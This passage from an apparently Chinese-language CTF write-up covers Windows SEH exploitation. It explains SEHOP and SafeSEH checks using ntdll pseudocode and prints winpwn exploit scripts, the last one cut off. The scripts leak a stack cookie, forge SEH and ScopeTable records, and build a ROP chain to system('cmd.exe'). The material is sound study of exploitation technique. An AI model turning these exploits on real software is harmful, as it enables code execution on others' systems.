leak code_base</span></span><br><span class="line">io = process(file_name)</span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp SEH + 0x154FA&#x27;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x114</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x114</span>)</span><br><span class="line">pe.address = u32(io.recv(<span class="number">3</span>).ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x012120</span></span><br><span class="line">li(<span class="string">&quot;code_base&quot;</span>, pe.address)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.3 attack SEH</span></span><br><span class="line">io = process(file_name)</span><br><span class="line">main_addr = pe.address + <span class="number">0x15450</span></span><br><span class="line">li(<span class="string">&quot;main_addr&quot;</span>, main_addr)</span><br><span class="line"><span class="comment"># windbgx.attach(io, &quot;bp SEH + 0x154FA\nbp SEH + 0x15545&quot;)</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp SEH + 0x15588&#x27;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"><span class="comment"># create fake SEH handler</span></span><br><span class="line">payload = <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x104</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># Stack_cookie</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># old_esp</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># exc_ptr</span></span><br><span class="line">payload += p32(stack_addr) <span class="comment"># next</span></span><br><span class="line">payload += p32(main_addr)  <span class="comment"># EXceptionHandler ==&gt; overwrite with our addr</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">sla(<span class="string">&quot;Give me one shot: &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.4 leak stack_cookie</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &quot;bp SEH + 0x154FA\nbp SEH + 0x15545&quot;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"><span class="comment"># create fake SEH handler</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&quot;\xcc&quot;</span>*<span class="number">4</span>)</span><br><span class="line">stack_cookie = u32(re(<span class="number">4</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie&quot;</span>, stack_cookie)</span><br><span class="line">sla(<span class="string">&quot;Give me one shot: &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.5 hijack control flow by rop dont trigger exceptionHandler</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &quot;bp SEH + 0x154FA\nbp SEH + 0x15545&quot;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"><span class="comment"># create fake SEH handler</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(stack_cookie) <span class="comment"># Stack_cookie</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># old_esp</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># exc_ptr</span></span><br><span class="line">payload += p32(stack_addr) <span class="comment"># next</span></span><br><span class="line">payload += p32(main_addr)  <span class="comment"># EXceptionHandler ==&gt; overwrite with our addr</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)*<span class="number">2</span> + p32(stack_addr) </span><br><span class="line">payload += p32(ucrtbased.symbols[<span class="string">&#x27;system&#x27;</span>]) + p32(main_addr) + p32(ucrtbased.search(<span class="string">&quot;cmd.exe&quot;</span>).<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&quot;\xcc&quot;</span>*<span class="number">4</span>)</span><br><span class="line">stack_cookie = u32(re(<span class="number">4</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie&quot;</span>, stack_cookie)</span><br><span class="line">sla(<span class="string">&quot;Give me one shot: &quot;</span>, <span class="built_in">str</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+<h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><p>由于 SageSEH 保护和 SEHOP 保护有关系，先来看看 SEHOP 是什么，在 <code>ntdll!RtlDispatchException</code> 中有对 SEH 链表的检查，下面是部分代码：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前线程的栈的限制和基址</span></span><br><span class="line">RtlpGetStackLimits(&amp;StackLimit, &amp;StackBase);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前线程的异常处理链表头部</span></span><br><span class="line">ExceptionList = NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化进程信息</span></span><br><span class="line">ProcessInformation = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询进程执行标志信息，如果失败则将信息置为0</span></span><br><span class="line"><span class="keyword">if</span> ( ZwQueryInformationProcess((HANDLE)<span class="number">0xFFFFFFFF</span>, ProcessExecuteFlags, &amp;ProcessInformation, <span class="number">4u</span>, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">    ProcessInformation = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查进程信息中的特定位或者异常链的有效性</span></span><br><span class="line"><span class="keyword">if</span> ( (ProcessInformation &amp; <span class="number">0x40</span>) != <span class="number">0</span> || RtlpIsValidExceptionChain(ExceptionList, StackLimit, StackBase) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 进入异常处理链表的遍历</span></span><br><span class="line">    RegistrationPointerForCheck = ExceptionList;</span><br><span class="line">    NestedRegistration = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( RegistrationPointerForCheck != (_EXCEPTION_REGISTRATION_RECORD *)<span class="number">-1</span> ) <span class="comment">// -1 表示异常链结束</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 检查异常处理节点的有效性</span></span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)RegistrationPointerForCheck &lt; StackLimit <span class="comment">// 异常处理节点不在栈中</span></span><br><span class="line">            || (<span class="type">unsigned</span> <span class="type">int</span>)&amp;RegistrationPointerForCheck[<span class="number">1</span>] &gt; StackBase <span class="comment">// 异常处理节点不在栈中</span></span><br><span class="line">            || ((<span class="type">unsigned</span> __int8)RegistrationPointerForCheck &amp; <span class="number">3</span>) != <span class="number">0</span> <span class="comment">// 异常处理节点的地址没有4字节对齐</span></span><br><span class="line">            || (Handler = RegistrationPointerForCheck-&gt;Handler, (<span class="type">unsigned</span> <span class="type">int</span>)Handler &lt; StackBase) <span class="comment">// 处理函数地址不在栈中</span></span><br><span class="line">                &amp;&amp; StackLimit &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)Handler <span class="comment">// 处理函数地址不在栈中</span></span><br><span class="line">            || !RtlIsValidHandler(Handler, ProcessInformation, pContext) ) <span class="comment">// 检查处理函数是否有效</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果发现异常处理节点不合法，设置异常记录标志为异常栈无效</span></span><br><span class="line">            pExcptRec-&gt;ExceptionFlags |= EXCEPTION_STACK_INVALID;</span><br><span class="line">            <span class="comment">// 跳转到异常处理出口</span></span><br><span class="line">            <span class="keyword">goto</span> DispatchExit;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>主要检查 SEH 是否满足如下条件：</p>
+<ul>
+<li>SEH 节点<strong>在栈中</strong></li>
+<li>SEH节点<strong>指向的 Handler 不在栈中</strong></li>
+<li>SEH 节点地址 <strong>4 字节对齐</strong></li>
+<li>SEH <strong>最后一个节点的 Next 为 -1</strong> 且 Handler 为 <code>RtlpFinalExceptionHandler</code></li>
+<li>SEH 节点的 <strong>Next</strong> 指向的下一个<strong>节点的地址一定大于当前节点</strong></li>
+</ul>
+<p>只要泄露栈地址就可以伪造 SEH 链表绕过 SEHOP 检查。</p>
+<p><strong>SafeSEH</strong></p>
+<p>在 <code>ntdll!RtlDispatchException</code> 中调用 <code>RtlIsValidHandler</code> 进一步检查 SEH 链表，伪代码如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">RtlIsValidHandler</span><span class="params">(<span class="type">void</span>* handler)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果 handler 所在的模块有 SafeSEH 表，则进行检查</span></span><br><span class="line">    <span class="keyword">if</span> (handler image has a SafeSEH table) &#123;</span><br><span class="line">        <span class="comment">// 在 SafeSEH 表中找到 handler，返回 TRUE</span></span><br><span class="line">        <span class="keyword">if</span> (handler found in the table)</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="comment">// 在 SafeSEH 表中未找到 handler，返回 FALSE</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果进程标志中设置了 ExecuteDispatchEnable 或 ImageDispatchEnable 位，则返回 TRUE</span></span><br><span class="line">    <span class="keyword">if</span> (ExecuteDispatchEnable|ImageDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="comment">// 如果 handler 所在页面可执行</span></span><br><span class="line">    <span class="keyword">if</span> (handler is on a executeable page) &#123;</span><br><span class="line">        <span class="comment">// 如果 handler 在一个模块中</span></span><br><span class="line">        <span class="keyword">if</span> (handler is in an image) &#123;</span><br><span class="line">            <span class="comment">// 如果模块设置了 IMAGE_DLLCHARACTERISTICS_NO_SEH 标志，返回 FALSE</span></span><br><span class="line">            <span class="keyword">if</span> (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)</span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            <span class="comment">// 如果模块是一个带有 ILonly 标志的 .NET 程序集，返回 FALSE</span></span><br><span class="line">            <span class="keyword">if</span> (image is a .NET assembly whith the ILonly flag <span class="built_in">set</span>)</span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            <span class="comment">// 否则返回 TRUE</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果 handler 不在模块中</span></span><br><span class="line">        <span class="keyword">if</span> (handler is not in an image) &#123;</span><br><span class="line">            <span class="comment">// 如果进程标志中设置了 ImageDispatchEnable 位，则返回 TRUE</span></span><br><span class="line">            <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="comment">// 否则返回 FALSE</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果 handler 所在页面不可执行</span></span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) &#123;</span><br><span class="line">        <span class="comment">// 如果进程标志中设置了 ExecuteDispatchEnable 位，则返回 TRUE</span></span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="comment">// 否则引发访问冲突异常</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>绕过方法：</strong></p>
+<ul>
+<li>将 <code>Handler</code> 覆盖指向有 SEH 但没有 SafeSEH 保护的 Image 即可绕过。</li>
+</ul>
+<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="SafeSEH-1"><a href="#SafeSEH-1" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p><strong>检查保护</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_21-25-45.png"
+                      alt="nipaste_2024-05-17_21-25-4"
+                ></p>
+<p>程序开了 SafeSEH，意味着我们不能像上一题一样直接覆盖 handler 函数地址劫持执行流，开了 SafeSEH 的程序会像保存 security_cookie 那样将调用的 handler 函数地址保存到一个叫 SafeSEH 表里面，如果这个地址不能在表里找到，程序就会崩溃报错。</p>
+<p><strong>静态分析</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_21-30-40.png"
+                      alt="nipaste_2024-05-17_21-30-4"
+                ></p>
+<p>程序中可以进行两次输入，意味着我们可以先泄露 stack_cookie，后栈溢出布置 ROP。需要注意的是 <code>*(_DWORD *)v8 &amp;= 0xFFF00u;</code>，这一行代码实际上是无论我们输入的地址是否合法，这一步都会将该地址设置为非法地址，并在下面赋值，从而强行走异常处理机制。</p>
+<p>先来继续看这张经典图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_21-35-15.png"
+                      alt="nipaste_2024-05-17_21-35-1"
+                ></p>
+<p>如果我们这里只考虑布置 ROP，那势必会破坏 CPPEH_RECORD 结构体，从而导致在异常处理的时候程序会崩溃，所以说这一题重点其实就是要<strong>恢复该结构体</strong>。</p>
+<p>不过幸好我们已经有了栈地址，程序基址，该有的都有了，实际上我们只需要通过调试，获取到未破坏前的结构体样貌，然后在通过已知地址去计算偏移，重新恢复结构体内容即可。</p>
+<p>具体内容就跟着 windbg 里面的数据去逐个计算偏移恢复，板子如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># restore the CPPEH_RECORD and ScopeTable to ensure ROP successfully</span></span><br><span class="line"><span class="comment">#-------------------fake_CPPEH_RECORD----------------------</span></span><br><span class="line">fake_CPPEH_RECORD = p32(stack_addr - <span class="number">0xe0</span>) <span class="comment"># old_esp</span></span><br><span class="line">fake_CPPEH_RECORD += p32(ucrtbased.address + <span class="number">0xafbd2</span>) <span class="comment"># exc_ptr</span></span><br><span class="line">fake_CPPEH_RECORD += p32(stack_addr + <span class="number">0x18c</span>) <span class="comment"># next</span></span><br><span class="line">fake_CPPEH_RECORD += p32(pe.address + <span class="number">0x1e30</span>)  <span class="comment"># EXceptionHandler ==&gt; overwrite with our addr</span></span><br><span class="line">fake_CPPEH_RECORD += p32(stack_addr ^ security_cookie) <span class="comment"># ScopeTable</span></span><br><span class="line">fake_CPPEH_RECORD += p32(<span class="number">0xfffffffe</span>) <span class="comment"># TryLevel</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 001390a0  ffffffe4 00000000 fffffe00 00000000  ................</span></span><br><span class="line"><span class="comment"># 001390b0  fffffffe 001318b7 001318bd 00000000  ................</span></span><br><span class="line"><span class="comment"># 001390c0  fffffffe 00000000 ffffffac 00000000  ................</span></span><br><span class="line"><span class="comment">#-------------------fake_ScopeTable-----------------------</span></span><br><span class="line">FilterFunc = pe.address + <span class="number">0x18b7</span></span><br><span class="line">HandlerFunc = pe.address + <span class="number">0x18bd</span></span><br><span class="line">fake_ScopeTable = p32(<span class="number">0xffffffe4</span>)   <span class="comment"># GSCookieOffset</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0x00000000</span>)  <span class="comment"># GSCookieXOROffset</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0xfffffe00</span>)  <span class="comment"># EHCookieOffset</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0x00000000</span>)  <span class="comment"># EHCookieXOROffset</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0xfffffffe</span>)  <span class="comment"># ScopeRecord.EnclosingLevel</span></span><br><span class="line">fake_ScopeTable += p32(FilterFunc)  <span class="comment"># ScopeRecord.FilterFunc</span></span><br><span class="line">fake_ScopeTable += p32(HandlerFunc) <span class="comment"># ScopeRecord.HandlerFunc</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0x00000000</span>)  <span class="comment"># end of ScopeTable  </span></span><br><span class="line"><span class="comment">#----------------------------------------------------------</span></span><br></pre></td></tr></table></figure></div>
+
+<p>上面唯一需要注意的是，ScopeTable 的计算，实际程序中会将 ScopeTable 的真实地址与 security_cookie 进行异或，所以我们这里也需要在覆盖的时候，覆盖其具体的异或值。</p>
+<p><strong>动态分析</strong></p>
+<p>步骤大体与上一题类似，唯一就是恢复这个两个结构体吧，这里展示一下如何找上面的一些伪造数据：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_21-46-13.png"
+                      alt="nipaste_2024-05-17_21-46-1"
+                ></p>
+<p><strong>最后效果</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_21-47-46.png"
+                      alt="nipaste_2024-05-17_21-47-4"
+                ></p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#--------------------------------------------------------------------</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">re = <span class="keyword">lambda</span> data: io.recv(data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data: io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: io.sendline(data)</span><br><span class="line">rl = <span class="keyword">lambda</span> data: io.recvuntil(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> content, data: (io.recvuntil(content), io.send(data))</span><br><span class="line">sla = <span class="keyword">lambda</span> content, data: (io.recvuntil(content), io.sendline(data))</span><br><span class="line">li = <span class="keyword">lambda</span> content, data: sys.stdout.write(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + content + <span class="string">&#x27; == &#x27;</span> + <span class="built_in">hex</span>(data) + <span class="string">&#x27;\x1b[0m\n&#x27;</span>)</span><br><span class="line">ucrtbased = winfile(<span class="string">&quot;ucrtbased.dll&quot;</span>)</span><br><span class="line"><span class="comment"># kernel32 = winfile(&quot;C:/Windows/SYSTEM32/kernel32.dll&quot;)</span></span><br><span class="line"><span class="comment"># kernel32 = winfile(&quot;C:/Windows/SysWOW64/kernel32.dll&quot;)</span></span><br><span class="line"><span class="comment"># ntdll = winfile(&quot;C:/Windows/SYSTEM32/ntdll.dll&quot;)</span></span><br><span class="line">file_name = <span class="string">&#x27;./SafeSEH.exe&#x27;</span></span><br><span class="line">pe = winfile(file_name, rebase = <span class="literal">True</span>)</span><br><span class="line">io = process(file_name)</span><br><span class="line"><span class="comment"># io = remote()</span></span><br><span class="line"><span class="comment">#--------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp SafeSEH + 0x1870&#x27;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.1 leak ucrtbased addr</span></span><br><span class="line">payload = <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x10c</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x10c</span>)</span><br><span class="line">ucrtbased.address = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x0afbd2</span></span><br><span class="line">li(<span class="string">&quot;ucrt_base&quot;</span>, ucrtbased.address)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step.2 leak code_base</span></span><br><span class="line">io = process(file_name)</span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x114</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x114</span>)</span><br><span class="line">pe.address = u32(io.recv(<span class="number">3</span>).ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x1e30</span></span><br><span class="line">li(<span class="string">&quot;code_base&quot;</span>, pe.address)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.3 leak stack_cookie</span></span><br><span class="line">io = process(file_name)</span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp SafeSEH + 0x18a8\n bp SafeSEH + 0x18C0&#x27;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"><span class="comment"># create fake SEH handler</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&quot;\xcc&quot;</span>*<span class="number">4</span>)</span><br><span class="line">stack_cookie = u32(re(<span class="number">4</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie&quot;</span>, stack_cookie)</span><br><span class="line">ebp = stack_addr + <span class="number">0x120</span></span><br><span class="line">security_cookie = ebp ^ stack_cookie</span><br><span class="line">li(<span class="string">&quot;security_cookie&quot;</span>, security_cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.4 bypass SEH</span></span><br><span class="line">main_addr = pe.address + <span class="number">0x1780</span></span><br><span class="line"><span class="comment"># create fake SEH handler</span></span><br><span class="line">payload = <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x104</span></span><br><span class="line">payload += p32(stack_cookie) <span class="comment"># Stack_cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># restore the CPPEH_RECORD and ScopeTable to ensure ROP successfully</span></span><br><span class="line"><span class="comment">#-------------------fake_CPPEH_RECORD----------------------</span></span><br><span class="line">fake_CPPEH_RECORD = p32(stack_addr - <span class="number">0xe0</span>) <span class="comment"># old_esp</span></span><br><span class="line">fake_CPPEH_RECORD += p32(ucrtbased.address + <span class="number">0xafbd2</span>) <span class="comment"># 